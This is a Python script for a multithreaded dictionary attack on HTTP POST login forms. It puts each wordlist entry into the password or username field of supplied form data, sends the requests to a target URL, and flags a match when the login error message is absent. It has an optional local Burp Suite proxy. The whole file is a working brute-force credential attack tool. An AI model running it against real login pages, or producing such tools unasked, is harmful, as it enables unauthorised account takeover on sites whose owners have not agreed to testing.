import time
import argparse
import re
import requests
import threading
import os

from itertools import islice
from termcolor import colored

# Exit codes
EXIT_SUCCESS = 0
ERR_FILEOPEN = 100
ERR_FILEMPTY = 101

# Default number of threads
DEFAULT_THREAD_NO = 10

# Flag to signal main thread to exit
EXIT_FLAG = 0

# Variables common to multiple functions
tests = 0  # Used to count login attempts made until exiting
thread_count = None  # Used to store number of threads that will run
args = None  # Used to store command line arguments
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080",
}
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

"""
Parse required and optional program arguments.
"""
def parse_arguments():
    # TODO: test everything again, with Burp Suite
    global args
    parser = argparse.ArgumentParser(description="HTTP POST form dictionary cracker")
    parser.add_argument("-u", "--url", type=str, action="store", required=True, help="specify target URL")
    parser.add_argument("-d", "--dict", type=str, action="store", required=True, help="specify dictionary path")
    parser.add_argument("--data", type=str, action="store", required=True, help="specify POST form data")
    parser.add_argument("-m", "--message", type=str, action="store", required=True, help="specify login error message "
                                                                                         "(used to check for a "
                                                                                         "password match)")
    parser.add_argument("-t", "--threads", type=int, action="store", required=False, help="specify number of threads "
                                                                                          "to use")
    parser.add_argument("-v", "--verbose", action="store_true", required=False, help="specify whether to print login "
                                                                                     "attempts")
    parser.add_argument("-p", "--proxy", action="store_true", required=False, help="specify whether to use "
                                                                                   "localhost:8080 proxy ("
                                                                                   "for debugging purposes, "
                                                                                   "use with Burp Suite)")
    parser.add_argument("-l", "--user", action="store_true", required=False, help="try dictionary entries as users "
                                                                                  "instead of passwords; password "
                                                                                  "from specified POST data will be "
                                                                                  "used")
    args = parser.parse_args()


"""
Craft POST request and send it; Check response body for login error message;
If the message is not present then a match was found.
"""
def crack(pURL, pData):
    global args, EXIT_FLAG, tests

    if args.verbose:
        print(colored('[!] Attempting: ', 'cyan'), str(pData), "\n")  # Be verbose
    tests = tests + 1  # Count number of attempts

    # Send POST request to 'pURL' with appropriate data & headers
    if args.proxy:
        global proxies
        r = requests.post(url=pURL, data=pData, headers=headers, proxies=proxies)
    else:
        r = requests.post(url=pURL, data=pData, headers=headers)
    r.close()

    # Search response body for login error message
    reg = re.search(args.message, r.text)

    if reg is None:  # If the login error message is not read
        print(colored('[+] Found possible match: ', 'green'), str(pData), "\n")
        EXIT_FLAG = 1  # Set flag to exit main thread

    return


"""
Main program logic; Get passwords from dictionary, modify POST data; 
Create threads and start them.
"""
def main():
    global thread_count, args, EXIT_FLAG, tests

    if os.stat(args.dict).st_size == 0:  # Dictionary file is empty
        print("[x] ")
        return ERR_FILEMPTY

    startTime = time.time()  # Set timestamp 1
    if not args.threads:
        thread_count = DEFAULT_THREAD_NO
        print("[!] Thread count not specified, running with default thread count [" + str(thread_count) + "] \n")
    else:
        thread_count = int(args.threads)
        print("[!] Running with specified thread count [" + str(thread_count) + "] \n")

    reached_EOF = False
    try:
        infile = open(args.dict, 'r')
    except Exception as e:
        print("[x] Error opening dictionary file: ", e, "\n")
        return ERR_FILEOPEN
    threads = []  # List of threads

    # Read through all passwords in the dictionary file in batches of 'thread_count' items
    while not reached_EOF:
        # 'list_batch' is a generator object, can be used in a loop
        list_batch = list(islice(infile, thread_count))
        batch_length = len(list_batch)
        # Remove \n and similar characters from all passwords
        list_batch = [p.strip() for p in list_batch]
        if batch_length < thread_count:  # Reached end of dictionary
            reached_EOF = True
        thread_count = min(batch_length, thread_count)  # Create one thread per password read from dictionary file
        for i in range(thread_count):
            pattern = "([a-zA-Z]+)=(.+)&([a-zA-Z]+)=(.+)"  # Pattern to identify two key-value pairs in POST data
            if args.user is True:
                repl = "\\1=" + str(list_batch[i]) + "&\\3=\\4"
            else:
                repl = "\\1=\\2&\\3=" + str(list_batch[i])
            current_data = re.sub(pattern=pattern, repl=repl, string=args.data)

            thread_args = (args.url, current_data)  # Tuple of arguments for crack() function
            # Create 'thread_count' thread objects with appropriate target function & arguments
            thr = threading.Thread(target=crack, name="thread-" + str(i), args=thread_args)
            threads.append(thr)

        for i in range(thread_count):
            threads[i].start()
            if EXIT_FLAG:
                print("[!] Program run time: ", time.time() - startTime, "\n")
                print("[!] Number of attempts: ", tests)
                exit(EXIT_SUCCESS)
        for i in range(thread_count):
            threads[i].join()
        threads = []


if __name__ == '__main__':
    parse_arguments()
    main()
